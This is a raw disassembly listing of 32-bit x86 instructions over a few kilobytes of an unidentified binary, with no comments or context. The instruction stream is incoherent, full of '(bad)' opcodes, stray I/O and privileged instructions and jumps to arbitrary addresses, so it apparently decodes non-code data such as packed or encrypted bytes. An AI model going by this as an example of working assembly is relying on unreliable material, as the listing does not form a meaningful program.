  419bcf:	fstp   DWORD PTR [edx-0x7d9a70fb]
  419bd5:	sbb    eax,0x48075da1
  419bda:	ins    BYTE PTR es:[edi],dx
  419bdb:	mov    ds:0xffa4d333,eax
  419be0:	jge    0x419bcd
  419be2:	test   BYTE PTR [eax],dl
  419be4:	shr    dh,cl
  419be6:	mov    esi,0x1c135af3
  419beb:	mov    esp,0x16ed99b
  419bf0:	add    cl,0x21
  419bf3:	fadd   DWORD PTR [ebx-0x41]
  419bf6:	scas   eax,DWORD PTR es:[edi]
  419bf7:	(bad)  
  419bf8:	fisttp WORD PTR [ebp-0x644276e7]
  419bfe:	sbb    dl,bl
  419c00:	clc    
  419c01:	pop    esi
  419c02:	add    esp,esp
  419c04:	dec    ebp
  419c05:	xor    ebx,DWORD PTR [ecx]
  419c07:	sti    
  419c08:	mov    BYTE PTR [edx-0x6eb43d54],dl
  419c0e:	inc    ecx
  419c0f:	xchg   edx,eax
  419c10:	aas    
  419c11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c12:	sbb    eax,0xfc7745f
  419c17:	xchg   DWORD PTR [edx],edi
  419c19:	out    dx,eax
  419c1a:	mov    ecx,DWORD PTR [ecx+0x65fd79c2]
  419c20:	push   0x1be17989
  419c25:	mov    ecx,0x7f1cc6e0
  419c2a:	lods   al,BYTE PTR ds:[esi]
  419c2b:	ins    DWORD PTR es:[edi],dx
  419c2c:	push   0x1d
  419c2e:	mov    ebx,DWORD PTR [eax-0x78]
  419c31:	and    ebp,ebx
  419c33:	test   DWORD PTR [eax-0x655dd129],0xf3dd1d60
  419c3d:	or     BYTE PTR [edx+0x32ae8178],0x98
  419c44:	fnstenv [edi+0x7e]
  419c47:	adc    edx,edi
  419c49:	test   DWORD PTR ds:0x826a5e65,esp
  419c4f:	inc    ebx
  419c50:	ins    DWORD PTR es:[edi],dx
  419c51:	or     BYTE PTR [edx+eax*1-0x69],dh
  419c55:	ror    esp,cl
  419c57:	inc    edi
  419c58:	cmp    ebp,ecx
  419c5a:	inc    edx
  419c5b:	inc    edx
  419c5c:	adc    al,0xa2
  419c5e:	rcr    BYTE PTR [eax+0x34],0xce
  419c62:	mov    ah,0x7f
  419c64:	(bad)  
  419c65:	sub    al,BYTE PTR ss:[eax+eax*4-0x7e]
  419c6a:	outs   dx,BYTE PTR ds:[esi]
  419c6b:	ins    BYTE PTR es:[edi],dx
  419c6c:	xchg   ecx,eax
  419c6d:	(bad)  
  419c6e:	ins    BYTE PTR es:[edi],dx
  419c6f:	enter  0xb7c9,0xa9
  419c73:	adc    edi,DWORD PTR [esi]
  419c75:	and    DWORD PTR [eax+ebx*1+0x541c2d85],ecx
  419c7c:	aas    
  419c7d:	pop    ebx
  419c7e:	sbb    DWORD PTR ds:0x851b693a,0xffffff91
  419c85:	xchg   BYTE PTR [edx-0x2e],dl
  419c88:	cdq    
  419c89:	mov    ch,0x65
  419c8b:	sbb    ch,BYTE PTR [esi+0x475e60f1]
  419c91:	cmp    al,ch
  419c93:	cmp    BYTE PTR [eax+0x8a2b09],ah
	...
  419d11:	add    BYTE PTR [eax],al
  419d13:	add    BYTE PTR [eax],ah
  419d15:	lahf   
  419d16:	arpl   WORD PTR [ebp-0x40110201],cx
  419d1c:	mov    gs,WORD PTR [ebx-0x4d0ebf00]
  419d22:	dec    ecx
  419d23:	mov    edx,0x13d69
  419d28:	ins    BYTE PTR es:[edi],dx
  419d29:	pop    es
  419d2a:	add    BYTE PTR [eax],al
  419d2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419d2d:	in     al,dx
  419d2e:	mov    cl,0xf3
  419d30:	fdivr  QWORD PTR [ecx]
  419d32:	adc    edx,DWORD PTR [ecx]
  419d34:	enter  0x6f1,0x79
  419d38:	jle    0x419d88
  419d3a:	mov    al,BYTE PTR [eax-0x338d6ad6]
  419d40:	jmp    0x419d1c
  419d42:	cmp    ah,bh
  419d44:	rcl    BYTE PTR [edx],1
  419d46:	jecxz  0x419cf3
  419d48:	repz xor esp,DWORD PTR [edi-0x31]
  419d4c:	xchg   edi,edi
  419d4e:	cmp    eax,0xd42964be
  419d53:	sub    ch,BYTE PTR [ebx]
  419d55:	mov    al,0x5b
  419d57:	sub    al,0x4c
  419d59:	pop    ebp
  419d5a:	iret   
  419d5b:	push   edi
  419d5c:	push   ecx
  419d5d:	mov    ds:0x6be71636,eax
  419d62:	inc    ebx
  419d63:	mov    ds:0xd5164352,al
  419d68:	imul   ebx,DWORD PTR [edx-0x1],0xa409fb02
  419d6f:	bound  ebp,QWORD PTR [eax-0x5b8b62b0]
  419d75:	addr16 jge 0x419d00
  419d78:	or     BYTE PTR [esi+0x57],ah
  419d7b:	mov    al,ds:0x3b5e4b58
  419d80:	or     edi,ecx
  419d82:	pusha  
  419d83:	aas    
  419d84:	cmp    al,0x6b
  419d86:	dec    edx
  419d87:	stos   DWORD PTR es:[edi],eax
  419d88:	fucom  st(3)
  419d8a:	lds    sp,DWORD PTR [edx+0x117bf513]
  419d91:	xchg   edi,eax
  419d92:	xchg   ebx,eax
  419d93:	mov    edi,0x7acb6130
  419d98:	jg     0x419de9
  419d9a:	bound  esi,QWORD PTR [edi+ebx*1+0x16]
  419d9e:	dec    esi
  419d9f:	jne    0x419d9c
  419da1:	bound  ecx,QWORD PTR [esi+0x5]
  419da4:	xchg   esi,eax
  419da5:	and    dh,dh
  419da7:	mov    ebp,0xd6ac0f0f
  419dac:	mov    ch,0xe
  419dae:	mov    eax,0x4c168061
  419db3:	sbb    BYTE PTR [ebx-0x29e0a36f],bl
  419db9:	(bad)  
  419dba:	mov    ebx,tr1
  419dbd:	test   eax,0x7c79dacf
  419dc2:	dec    esi
  419dc3:	adc    ch,dh
  419dc5:	xlat   BYTE PTR ds:[ebx]
  419dc6:	(bad)  
  419dc8:	ins    BYTE PTR es:[edi],dx
  419dc9:	cmp    al,0x43
  419dcb:	gs cmp eax,0x93aa7c89
  419dd1:	and    BYTE PTR [edx],ch
  419dd3:	xor    al,0x91
  419dd5:	adc    al,0x9
  419dd7:	ds in  al,dx
  419dd9:	je     0x419e4d
  419ddb:	call   0xf5a4d83b
  419de0:	fstp   QWORD PTR [edx]
  419de2:	ins    BYTE PTR es:[edi],dx
  419de3:	pushf  
  419de4:	sub    eax,0x15bce1fd
  419de9:	mov    ebp,eax
  419deb:	mov    bh,0x13
  419ded:	sar    esp,cl
  419def:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419df0:	sub    ch,al
  419df2:	sbb    esi,0x76
  419df5:	rcl    DWORD PTR cs:[edi-0x2f],cl
  419df9:	add    BYTE PTR [ecx],ch
  419dfb:	mov    ss,WORD PTR [ebx-0x55]
  419dfe:	lds    edx,FWORD PTR [ebx-0x17a55dad]
  419e04:	or     eax,0xa79ba5a4
  419e09:	call   FWORD PTR [eax-0x63794ffb]
  419e0f:	scas   al,BYTE PTR es:[edi]
  419e10:	push   edx
  419e11:	and    bl,BYTE PTR [ecx]
  419e13:	dec    eax
  419e14:	xor    eax,0xb26df13
  419e19:	mov    WORD PTR [ebp+0x24fd906],ss
  419e1f:	call   0x975c:0xfa94197c
  419e26:	cmp    edi,DWORD PTR [ebx+0x51d18a82]
  419e2c:	(bad)
  419e30:	fwait
  419e31:	scas   eax,DWORD PTR es:[edi]
  419e32:	outs   dx,DWORD PTR ds:[esi]
  419e33:	outs   dx,BYTE PTR ds:[si]
  419e35:	inc    esp
  419e36:	repz fild WORD PTR [eax-0x2]
  419e3a:	sub    dh,dh
  419e3c:	xchg   esp,eax
  419e3d:	pop    ss
  419e3e:	test   eax,0xed9ee1a5
  419e43:	cmp    al,bl
  419e45:	mov    al,0x45
  419e47:	jge    0x419e2a
  419e49:	lds    ecx,FWORD PTR [edi-0x3976eaa7]
  419e4f:	ror    ebp,0x79
  419e52:	std    
  419e53:	cs scas eax,DWORD PTR es:[edi]
  419e55:	mov    al,ds:0x23c9a42
  419e5a:	and    al,0x77
  419e5c:	xor    al,0x35
  419e5e:	mov    ds:0x9bca38ce,eax
  419e63:	(bad)  
  419e64:	daa    
  419e65:	xchg   ebp,eax
  419e66:	sbb    DWORD PTR [ecx],ecx
  419e68:	xor    eax,0xa98c4309
  419e6d:	cmp    cl,BYTE PTR [esi-0xa]
  419e70:	sub    BYTE PTR [edi+0x77],ch
  419e73:	(bad)  
  419e74:	cmp    ebp,ecx
  419e76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e77:	shr    BYTE PTR [ecx+edi*8],1
  419e7a:	ret    0x418e
  419e7d:	push   0x4194afab
  419e82:	push   ebx
  419e83:	push   0x72
  419e85:	mov    ds:0x67be2bc3,al
  419e8a:	adc    al,bh
  419e8c:	xor    DWORD PTR [ecx+ecx*8],ecx
  419e8f:	cwde   
  419e90:	push   esp
  419e91:	(bad)  
  419e92:	push   ebp
  419e93:	stc    
  419e94:	dec    ebp
  419e95:	mov    dl,dl
  419e97:	mov    edx,0x5e630a8f
  419e9c:	repnz (bad) 
  419e9f:	mov    eax,ds:0xcef5c773
  419ea4:	pop    ss
  419ea5:	fucomi st,st(7)
  419ea7:	xchg   edx,eax
  419ea8:	and    DWORD PTR [ebx],eax
  419eaa:	arpl   WORD PTR [edx+0x28f8c77e],cx
  419eb0:	pop    es
  419eb1:	fsub   st(3),st
  419eb3:	adc    eax,0x278bb298
  419eb8:	xor    BYTE PTR [ecx],al
  419eba:	and    esp,DWORD PTR [ecx+0x5e]
  419ebd:	jae    0x419ef6
  419ebf:	lods   eax,DWORD PTR ds:[esi]
  419ec0:	dec    esp
  419ec1:	xchg   ebx,eax
  419ec2:	and    DWORD PTR [ecx+0x1b],eax
  419ec5:	add    edi,DWORD PTR [ebx+0x3c6f2d51]
  419ecb:	hlt    
  419ecc:	push   ebp
  419ecd:	mov    ds:0xea51f402,eax
  419ed2:	addr16 dec edx
  419ed4:	sbb    eax,0x2a8ec42c
  419ed9:	mov    bh,0xd1
  419edb:	push   esp
  419edc:	aad    0xbc
  419ede:	frstor [esi+0x47]
  419ee1:	cmp    BYTE PTR [edx-0x26c57d13],ah
  419ee7:	mov    bl,0x4d
  419ee9:	pop    ebx
  419eea:	adc    eax,0xbca495fb
  419eef:	add    eax,0x370847b2
  419ef4:	mov    WORD PTR [edi-0x18],fs
  419ef7:	mov    esi,0x40ccfe93
  419efc:	imul   edx,DWORD PTR [eax+0x4b],0x5e258432
  419f03:	push   0xffffff90
  419f05:	push   ds
  419f06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f07:	test   al,0xbe
  419f09:	and    edi,DWORD PTR [edi+0x50]
  419f0c:	outs   dx,DWORD PTR ds:[esi]
  419f0d:	iret   
  419f0e:	push   es
  419f0f:	and    DWORD PTR [edi-0x44b76731],esi
  419f15:	mov    WORD PTR [ebp+0x61],ds
  419f18:	in     al,0x62
  419f1a:	adc    cl,cl
  419f1c:	xchg   esi,eax
  419f1d:	ffreep st(5)
  419f1f:	inc    ebp
  419f20:	out    0x6c,eax
  419f22:	dec    esp
  419f23:	js     0x419f6e
  419f25:	je     0x419ef3
  419f27:	mov    BYTE PTR [ecx+ecx*1+0x1f],dl
  419f2b:	in     al,0x79
  419f2d:	jle    0x419f18
  419f2f:	lea    ecx,[eax+0x4744381c]
  419f35:	ret    0x6e9e
  419f38:	mov    ds:0x192032c,eax
  419f3d:	data16 xlat BYTE PTR ds:[ebx]
  419f3f:	js     0x419ef7
  419f41:	adc    esp,DWORD PTR [edx+0x5006db8b]
  419f47:	jmp    0x5e7:0x44554112
  419f4e:	scas   eax,DWORD PTR es:[edi]
  419f4f:	or     bh,ch
  419f51:	int3   
  419f52:	sbb    esp,edx
  419f54:	and    cl,BYTE PTR [edx+ecx*4-0x205f5f10]
  419f5b:	popf   
  419f5c:	xor    al,0x9a
  419f5e:	sahf   
  419f5f:	xchg   BYTE PTR [esi],ch
  419f61:	and    WORD PTR [ebx+0xe],0xf05a
  419f67:	data16 add ah,BYTE PTR ds:0x39a6b871
  419f6e:	add    ebp,DWORD PTR [ecx]
  419f70:	imul   esp,eax,0x7c
  419f73:	pop    es
  419f74:	sar    BYTE PTR [eax+0x19],cl
  419f77:	push   0x8
  419f79:	sbb    al,0xbd
  419f7b:	sub    DWORD PTR [edi+0x1634a066],ebp
  419f81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f82:	inc    edx
  419f83:	enter  0x9c65,0x15
  419f87:	xchg   ebp,eax
  419f88:	jg     0x419feb
  419f8a:	shr    DWORD PTR [esi],cl
  419f8c:	push   esi
  419f8d:	fstp   DWORD PTR [ecx-0x6c9b8ef8]
  419f93:	sub    esp,eax
  419f95:	test   DWORD PTR [edi-0x900c2e0],0x263eb678
  419f9f:	cwde   
  419fa0:	jo     0x419fac
  419fa2:	scas   al,BYTE PTR es:[edi]
  419fa3:	iret   
  419fa4:	(bad)  
  419fa6:	js     0x419f72
  419fa8:	loopne 0x419fea
  419faa:	or     eax,0xb47e6278
  419faf:	fldcw  WORD PTR [ebp+0x59]
  419fb2:	mov    ah,0xb0
  419fb4:	repz shl eax,1
  419fb7:	das    
  419fb8:	std    
  419fb9:	ins    DWORD PTR es:[edi],dx
  419fba:	daa    
  419fbb:	cmc    
  419fbc:	fidivr WORD PTR es:[esi]
  419fbf:	add    al,0x1
  419fc1:	mov    al,ds:0x922143e3
  419fc6:	cmp    dh,0xc7
  419fc9:	(bad)  
  419fca:	xor    DWORD PTR [edi],0x4ac2b6be
  419fd0:	test   DWORD PTR [ecx],ebp
  419fd2:	jmp    0x41a032
  419fd4:	mov    ebp,0x84f715b3
  419fd9:	sub    DWORD PTR [esi-0x33b6cb87],edx
  419fdf:	stos   DWORD PTR es:[edi],eax
  419fe0:	test   esp,ecx
  419fe2:	sub    al,0x6
  419fe4:	stos   BYTE PTR es:[edi],al
  419fe5:	mov    dh,0x66
  419fe7:	mov    ch,0x8a
  419fe9:	cli    
  419fea:	or     DWORD PTR [eax],ecx
  419fec:	leave  
  419fed:	lods   al,BYTE PTR ds:[esi]
  419fee:	in     al,0xbf
  419ff0:	inc    edx
  419ff1:	jno    0x419fd4
  419ff3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ff4:	fbstp  TBYTE PTR [esi+0x5862d7ef]
  419ffa:	shl    BYTE PTR [ecx-0x64ccef7e],0x39
  41a001:	add    eax,0x7e1d67e8
  41a006:	cmp    BYTE PTR [ecx-0xc],al
  41a009:	pop    es
  41a00a:	dec    edx
  41a00b:	stos   DWORD PTR es:[edi],eax
  41a00c:	push   edx
  41a00d:	mov    ds:0xeea75c49,eax
  41a012:	sub    eax,0x20f21db4
  41a017:	sbb    al,0x6e
  41a019:	popa   
  41a01a:	add    eax,0x1131c2d6
  41a01f:	or     eax,ebx
  41a021:	xchg   edi,eax
  41a022:	or     DWORD PTR [edi+0x5a],edx
  41a025:	sbb    eax,0xf1e270f
  41a02a:	mov    cl,0x8f
  41a02c:	push   cs
  41a02d:	pop    es
  41a02e:	mov    esp,0x9ede13b
  41a033:	je     0x41a0ac
  41a035:	jmp    DWORD PTR ss:[edi+0xf]
  41a039:	mov    ?,WORD PTR [ebp*8+0x3e66e8a9]
  41a040:	and    BYTE PTR [edx+0x69ad3a5e],cl
  41a046:	gs es jbe 0x419ffe
  41a04a:	fidivr WORD PTR [edx]
  41a04c:	pop    esi
  41a04d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a04e:	cmp    dl,ah
  41a050:	xchg   ebp,eax
  41a051:	mov    cl,0x26
  41a053:	and    al,0xf1
  41a055:	adc    DWORD PTR [ecx+0x58f81e58],esp
  41a05b:	mov    al,0xa1
  41a05d:	ret    0x4a13
  41a060:	sbb    dl,ah
  41a062:	fldenv [ebp+edx*4-0x27]
  41a066:	add    al,0x87
  41a068:	dec    edx
  41a069:	into   
  41a06a:	mov    esp,0x9687e3ec
  41a06f:	pop    edi
  41a070:	mov    ds:0xa999d577,al
  41a075:	(bad)  
  41a076:	(bad)  
  41a077:	cmp    ebp,esi
  41a079:	pop    ebx
  41a07a:	jp     0x41a0e7
  41a07c:	mov    bl,0x96
  41a07e:	sub    esp,DWORD PTR [esi-0x2b]
  41a081:	push   ecx
  41a082:	adc    eax,0x70718a7e
  41a087:	mov    bh,0x8f
  41a089:	sbb    eax,DWORD PTR [ebp-0x1636a077]
  41a08f:	jmp    0x793fa72e
  41a094:	push   esp
  41a095:	pop    ecx
  41a096:	or     DWORD PTR [ecx+ecx*8+0x5c],0x70
  41a09b:	dec    esp
  41a09c:	sar    BYTE PTR [ecx],0x70
  41a09f:	adc    al,0x54
  41a0a1:	dec    eax
  41a0a2:	adc    edx,DWORD PTR [esi]
  41a0a4:	mov    DWORD PTR [edx],esp
  41a0a6:	call   0xdaca:0xf0c6483b
  41a0ad:	pop    ebx
  41a0ae:	pop    es
  41a0af:	cmp    DWORD PTR [ecx+0x56ccb6a3],ebx
  41a0b5:	repz loopne 0x41a119
  41a0b8:	cmp    DWORD PTR [esi+eiz*1-0x4a],eax
  41a0bc:	and    bh,dh
  41a0be:	or     eax,ecx
  41a0c0:	stc    
  41a0c1:	sbb    ah,BYTE PTR [eax-0x27]
  41a0c4:	(bad)  
  41a0c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a0c6:	dec    edx
  41a0c7:	adc    eax,0xf21de3ea
  41a0cc:	cli    
  41a0cd:	(bad)  
  41a0cf:	mov    ebx,0x67f79019
  41a0d4:	mov    cl,0xeb
  41a0d6:	xchg   ebx,eax
  41a0d7:	int    0x21
  41a0d9:	jnp    0x41a115
  41a0db:	test   DWORD PTR [eax-0x73ab0ecd],esp
  41a0e1:	fwait
  41a0e2:	test   DWORD PTR ds:0xd23b93cb,esi
  41a0e8:	xchg   DWORD PTR [ecx-0x6c6950f7],ebx
  41a0ee:	stc    
  41a0ef:	inc    ebx
  41a0f0:	push   ebp
  41a0f1:	dec    ecx
  41a0f2:	sbb    eax,0xf4063a45
  41a0f7:	mov    al,BYTE PTR [edx-0x4f]
  41a0fa:	add    al,0xde
  41a0fc:	lock rcr bh,cl
  41a0ff:	dec    esi
  41a100:	ins    DWORD PTR es:[edi],dx
  41a101:	xor    cl,BYTE PTR [edx]
  41a103:	xchg   ebx,eax
  41a104:	es in  al,0xf7
  41a107:	test   DWORD PTR [ebx+edx*2],edx
  41a10a:	test   DWORD PTR [ebx+edi*2],ebx
  41a10d:	inc    esp
  41a10e:	icebp  
  41a10f:	mul    BYTE PTR [edi+0x35add2e8]
  41a115:	sti    
  41a116:	xor    al,0xb8
  41a118:	fisub  WORD PTR [edx]
  41a11a:	jo     0x41a162
  41a11c:	imul   ebp,DWORD PTR [ebx-0x166fcba0],0x10ee9652
  41a126:	inc    edx
  41a127:	sub    ch,BYTE PTR [ebx]
  41a129:	out    0x3e,eax
  41a12b:	xchg   ecx,eax
  41a12c:	stc    
  41a12d:	push   esp
  41a12e:	int3   
  41a12f:	enter  0x6eef,0x8b
  41a133:	push   esi
  41a134:	mov    ebp,0x63eeb806
  41a139:	dec    edx
  41a13a:	adc    esp,ebp
  41a13c:	push   esi
  41a13d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a13e:	inc    edi
  41a13f:	add    al,0x9f
  41a141:	in     al,0x92
  41a143:	mov    ebx,0xc7cc8545
  41a148:	sti    
  41a149:	cmc    
  41a14a:	mov    cl,0xa
  41a14c:	dec    ecx
  41a14d:	cmp    BYTE PTR ds:0x76c3ac51,ah
  41a153:	jns    0x41a1b5
  41a155:	test   DWORD PTR [eax-0x73ecddf2],0x16327de7
  41a15f:	clc    
  41a160:	sub    ebp,DWORD PTR [edi-0x6c049bea]
  41a166:	ror    DWORD PTR [esi+0x42],0x2
  41a16a:	popa   
  41a16b:	outs   dx,BYTE PTR ds:[esi]
  41a16c:	rol    ecx,1
  41a16e:	sub    al,0x36
  41a170:	mov    al,BYTE PTR [esi]
  41a172:	and    al,0x97
  41a174:	ins    BYTE PTR es:[edi],dx
  41a175:	leave  
  41a176:	add    esp,DWORD PTR [esi-0x7d3c9dd8]
  41a17c:	jae    0x41a1b1
  41a17e:	fwait
  41a17f:	mov    bh,ah
  41a181:	bound  esp,QWORD PTR [edx-0x20]
  41a184:	inc    ecx
  41a185:	xchg   esi,eax
  41a186:	mov    dh,0x5c
  41a188:	pop    esp
  41a189:	and    BYTE PTR [ebp-0x7eae3f6f],0xf6
  41a190:	sar    BYTE PTR [ecx+0x4f],0x8a
  41a194:	mov    ebx,0xd3706866
  41a199:	cdq    
  41a19a:	fiadd  WORD PTR [ebx-0x27]
  41a19d:	adc    cl,BYTE PTR [esi-0x3d71a3c5]
  41a1a3:	add    DWORD PTR [edi+0x62],ebx
  41a1a6:	jo     0x41a1bc
  41a1a8:	inc    esi
  41a1a9:	cmp    BYTE PTR [ebp+0x5e3c7aa],al
  41a1af:	js     0x41a18d
  41a1b1:	pop    ecx
  41a1b2:	mov    ds:0x7c5a28ac,eax
  41a1b7:	fmul   QWORD PTR [ebp+0x263f0132]
  41a1bd:	add    al,0xb0
  41a1bf:	xor    eax,0x9e7b7fa7
  41a1c4:	outs   dx,BYTE PTR ds:[esi]
  41a1c5:	push   eax
  41a1c6:	sub    eax,0x578c9f3e
  41a1cb:	fiadd  WORD PTR [edi]
  41a1cd:	pop    es
  41a1ce:	xor    eax,0xe7f52a9c
  41a1d3:	pop    edx
  41a1d4:	aas    
  41a1d5:	or     ch,BYTE PTR [edx]
  41a1d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a1d8:	adc    al,0x78
  41a1da:	(bad)  
  41a1db:	mov    bl,0xc5
  41a1dd:	or     BYTE PTR [edx+0x5a8058a8],cl
  41a1e3:	repz xor DWORD PTR [esi+0x41],esp
  41a1e7:	dec    edi
  41a1e8:	int    0x27
  41a1ea:	dec    ebx
  41a1ec:	cmp    DWORD PTR [ebp+0x4a],esi
  41a1ef:	jb     0x41a24a
  41a1f1:	jb     0x41a17c
  41a1f3:	xor    esp,DWORD PTR ds:0xa0daa3e1
  41a1f9:	sbb    eax,0x1c06afe6
  41a1fe:	ret    0x1173
  41a201:	ds shr ebx,0x6a
  41a205:	mov    BYTE PTR [esi-0x21479c68],dl
  41a20b:	arpl   WORD PTR [eax-0x91c95a7],si
  41a211:	jae    0x41a1f8
  41a213:	fwait
  41a214:	xchg   ecx,eax
  41a215:	sbb    eax,0xc9a79267
  41a21a:	mov    esi,0xe101a509
  41a21f:	pop    esp
  41a220:	cli    
  41a221:	popf   
  41a222:	xchg   edi,eax
  41a223:	lahf   
  41a224:	sub    BYTE PTR [eax-0x63c9efa4],ah
  41a22a:	in     al,dx
  41a22b:	shl    DWORD PTR [eax+0x4c861a16],cl
  41a231:	sbb    DWORD PTR [edx],edi
  41a233:	cwde   
  41a234:	cmp    ebx,ebx
  41a236:	and    DWORD PTR [ebx+0x44bb66c3],ebp
  41a23c:	clc    
  41a23d:	cmc    
  41a23e:	push   ebx
  41a23f:	pop    eax
  41a240:	call   FWORD PTR [edi+0x31]
  41a243:	shl    DWORD PTR [ecx+0x62eaae3b],1
  41a249:	mov    ebp,0x344a39b3
  41a24e:	and    cl,BYTE PTR [ecx-0x7b]
  41a251:	(bad)  
  41a252:	mov    DWORD PTR [esp+eax*8],ebp
  41a255:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a256:	and    eax,0x57fdd59b
  41a25b:	xchg   ebx,eax
  41a25c:	scas   al,BYTE PTR es:[edi]
  41a25d:	out    dx,eax
  41a25e:	mov    edx,0x91fc04d5
  41a263:	repz fxch st(6)
  41a267:	ja     0x41a24b
  41a269:	jmp    0x67ec7811
  41a26e:	in     eax,0xe
  41a270:	ins    BYTE PTR es:[edi],dx
  41a271:	or     ah,BYTE PTR ds:0x73a5f53b
  41a277:	sbb    ch,BYTE PTR [ebx+0x36]
  41a27a:	push   0xffffffc7
  41a27c:	hlt    
  41a27d:	jnp    0x41a22e
  41a27f:	pop    ebp
  41a280:	mov    edi,0x814790fa
  41a285:	call   0x7966914a
  41a28a:	lea    esi,[eax-0x49]
  41a28d:	lds    ecx,FWORD PTR [ecx]
  41a28f:	xor    DWORD PTR [ecx+0x4c615737],esi
  41a295:	and    cl,BYTE PTR [ecx-0x4813c3ff]
  41a29b:	push   0x19ef597c
  41a2a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a2a1:	(bad)  
  41a2a3:	inc    ebx
  41a2a4:	or     bh,BYTE PTR [ebp-0x895e04e]
  41a2aa:	push   edx
  41a2ab:	retf   0x7ee4
  41a2ae:	daa    
  41a2af:	mov    dh,0x90
  41a2b1:	test   DWORD PTR [esi+0x3f655b0d],esi
  41a2b7:	cmp    esi,edx
  41a2b9:	mov    al,ds:0xe2b7681e
  41a2be:	add    ebp,DWORD PTR [esi+eax*1-0x57]
  41a2c2:	mov    dh,0xad
  41a2c4:	cmp    DWORD PTR [edx-0x10830e12],ebx
  41a2ca:	fs cli 
  41a2cc:	push   eax
  41a2cd:	inc    edx
  41a2ce:	sbb    eax,0x3fd38261
  41a2d3:	out    0xea,eax
  41a2d5:	fsubr  DWORD PTR [eax+0x4e]
  41a2d8:	fst    DWORD PTR [eax-0x3d]
  41a2db:	sti    
  41a2dc:	stos   BYTE PTR es:[edi],al
  41a2dd:	mov    al,ds:0xa862a48d
  41a2e2:	push   cs
  41a2e3:	jecxz  0x41a2d1
  41a2e5:	gs repz pop ss
  41a2e8:	lods   al,BYTE PTR ds:[esi]
  41a2e9:	mov    bl,0x97
  41a2eb:	lock test eax,0xbf08afa9
  41a2f1:	push   eax
  41a2f2:	add    BYTE PTR [edi-0x76],ch
  41a2f5:	dec    esp
  41a2f6:	sbb    al,0x23
  41a2f8:	gs dec edi
  41a2fa:	loope  0x41a2b5
  41a2fc:	pop    es
  41a2fd:	(bad)  
  41a2ff:	pop    ss
  41a300:	sub    DWORD PTR [eax+0x63ee42cf],esp
  41a306:	cmp    ebx,DWORD PTR [esi-0xa8a47a0]
  41a30c:	in     al,0xb0
  41a30e:	rol    bh,1
  41a310:	sub    al,BYTE PTR [edi+edx*1+0x2c]
  41a314:	pop    ds
  41a315:	retf   
  41a316:	out    dx,eax
  41a317:	sub    dh,BYTE PTR [esi-0x77]
  41a31a:	mov    cl,0x8e
  41a31c:	push   edx
  41a31d:	mov    dh,0x94
  41a31f:	xor    eax,0x3102648f
  41a324:	pop    eax
  41a325:	inc    eax
  41a326:	and    BYTE PTR [esi+0x4c48679f],cl
  41a32c:	jp     0x41a2f2
  41a32e:	mov    ah,0xcd
  41a330:	add    ah,dh
  41a332:	outs   dx,BYTE PTR ds:[esi]
  41a333:	imul   eax,DWORD PTR [ebp+0x2],0x5e
  41a337:	ja     0x41a2bf
  41a339:	jmp    0x77f4:0x8b1c138
  41a340:	frstor [ebp+0x29]
  41a343:	test   BYTE PTR [edi],0xe2
  41a346:	mov    WORD PTR [esi+0x331054b],fs
  41a34c:	or     dh,BYTE PTR ds:0x2822c8a1
  41a352:	jg     0x41a335
  41a354:	sbb    eax,DWORD PTR [ebx+0x792615ce]
  41a35a:	cwde   
  41a35b:	mov    DWORD PTR [esi+eax*8-0x40112106],ebx
  41a362:	pop    edx
  41a363:	mov    bh,0x98
  41a365:	and    al,0x1d
  41a367:	pop    edi
  41a368:	dec    ebp
  41a369:	call   FWORD PTR [eax-0x27c92c3]
  41a36f:	add    al,0x25
  41a371:	mov    al,ds:0x89b85c89
  41a376:	int3   
  41a377:	xchg   BYTE PTR [esi+0x52],cl
  41a37a:	fmul   QWORD PTR [edx+0x37e74190]
  41a380:	pop    ds
  41a381:	add    DWORD PTR [ebp-0x56],0x9e2fef96
  41a388:	xor    dh,BYTE PTR [ecx]
  41a38a:	add    ebp,DWORD PTR [esi+0x7f42567c]
  41a390:	aad    0x94
  41a392:	adc    BYTE PTR [esi-0xd2e5a0d],dh
  41a398:	jne    0x41a348
  41a39a:	dec    esp
  41a39b:	test   DWORD PTR [ebx],ebp
  41a39d:	adc    DWORD PTR [ecx+0x684d19cf],ebx
  41a3a3:	pop    edx
  41a3a4:	loope  0x41a411
  41a3a6:	out    dx,eax
  41a3a7:	clc    
  41a3a8:	dec    esi
  41a3a9:	mov    ebp,0xa7c85b2d
  41a3ae:	je     0x41a3f5
  41a3b0:	stos   DWORD PTR es:[edi],eax
  41a3b1:	adc    BYTE PTR [edx+0x5dc5f4ad],bh
  41a3b7:	pop    eax
  41a3b8:	lods   al,BYTE PTR ds:[esi]
  41a3b9:	jl     0x41a348
  41a3bb:	(bad)  
  41a3bc:	and    dh,al
  41a3be:	mov    edi,0x8c78415b
  41a3c3:	mov    WORD PTR [esi],cs
  41a3c5:	mov    BYTE PTR [edi],dl
  41a3c7:	xchg   ecx,eax
  41a3c8:	push   ebx
  41a3c9:	sbb    ah,BYTE PTR [ebp+0xbe6a5e8]
  41a3cf:	pop    ecx
  41a3d0:	(bad)  
  41a3d1:	inc    eax
  41a3d3:	fsub   st(3),st
  41a3d5:	jbe    0x41a3a8
  41a3d7:	xchg   edi,eax
  41a3d8:	cmp    ebx,DWORD PTR [ebx-0x63]
  41a3db:	jp     0x41a3ee
  41a3dd:	jg     0x41a3e9
  41a3df:	retf   0x84c3
  41a3e2:	xchg   ebp,eax
  41a3e3:	xor    al,0x80
  41a3e5:	dec    eax
  41a3e6:	mov    esi,0xe6863a1a
  41a3eb:	mov    dl,0x79
  41a3ed:	xchg   edx,eax
  41a3ee:	sub    dh,BYTE PTR ds:0x81179833
  41a3f4:	jmp    0x1c0b8ab
  41a3f9:	adc    DWORD PTR [edi-0x7a1b6059],0xad26ae4
  41a403:	or     eax,0x3221dd52
